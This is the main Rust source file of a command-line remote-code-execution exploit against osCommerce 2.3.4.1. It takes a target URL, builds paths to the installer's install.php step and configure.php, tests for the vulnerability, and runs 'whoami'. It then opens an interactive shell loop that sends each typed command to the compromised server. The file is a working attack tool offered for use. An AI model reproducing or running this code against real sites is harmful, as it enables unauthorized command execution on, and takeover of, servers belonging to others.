use termion::color;
use ctrlc;
use clap::{Arg, App};
use std::process;
use rustyline::error::ReadlineError;
use rustyline::Editor;

mod exploit;

fn main() {
     // Handle CTRL-C 
     ctrlc::set_handler(move || {
        println!("{}[!] Received Ctrl+C\n[-] Exiting!{}",color::Fg(color::Red), 
        color::Fg(color::Reset));
        process::exit(0);
    }).expect("[-] Error setting Ctrl-C handler");

     // Command Line Arguments
     let matches = App::new("osCommerce 2.3.4.1 Exploit")
     .version("0.1.0")
     .author("@whokilleddb")
     .about("RCE Exploit on osCommerece v2.3.4.1")
     .arg(Arg::new("url")
         .short('u')
         .long("url")
         .help("URL enpoint")
         .required(true)
         .takes_value(true))
     .get_matches();

    let url = matches.value_of("url").unwrap();
    println!("[+] {}RCE Exploit For osCommerce v2.3.4{}",color::Fg(color::Cyan),color::Fg(color::Reset));
    println!("[!] URL: {}{}{}",color::Fg(color::Red),url,color::Fg(color::Reset));
    exploit::testvuln(url);
    
    let target_url = if  url.chars().last().unwrap() == '/' {
        format!("{}{}",url,"install/install.php?step=4")
    } else {
        format!("{}{}",url,"/install/install.php?step=4")
    };
    
    let exec_url = if  url.chars().last().unwrap() == '/' {
        format!("{}{}",url,"install/includes/configure.php")
    } else {
        format!("{}{}",url,"/install/includes/configure.php")
    };
    
    println!("[!] {}Checking for RCE!{}",color::Fg(color::Magenta),color::Fg(color::Reset));
    println!("[!] Trying to get the user the server is runnning as: ");
    match exploit::exec_command(target_url.as_str(),exec_url.as_str(),"whoami"){
        Ok(_resp) => _resp,
        Err(_err) => exploit::exit_on_error("Something Went Wrong!"),
    }
    
    println!("[!] Creating a {}Temporary Shell{}",color::Fg(color::Green),color::Fg(color::Reset));
    let mut temp_shell = Editor::<()>::new();
    if  !(temp_shell.load_history(".history").is_err()){
        println!("[!] Loaded Previous History!");
    }

    loop {
        let readline = temp_shell.readline("ðŸ‘‰ ");
        match readline {
            Ok(line) => {
                temp_shell.add_history_entry(line.as_str());
                match exploit::exec_command(target_url.as_str(),exec_url.as_str(),line.as_str()){
                    Ok(_resp) => _resp,
                    Err(_) => exploit::exit_on_error("Something Went Wrong!"),
                }
            },
            Err(ReadlineError::Interrupted) => {
                println!("[-] {}Received Ctrl-C{}",color::Fg(color::Red),color::Fg(color::Reset));
                break
            },
            Err(ReadlineError::Eof) => {
                println!("[-] {}Received Ctrl-D {}",color::Fg(color::Magenta),color::Fg(color::Reset));
                break
            },
            Err(err) => {
                println!("Error: {:?}", err);
                break
            }
        }
    }

    temp_shell.save_history(".history").unwrap();
}
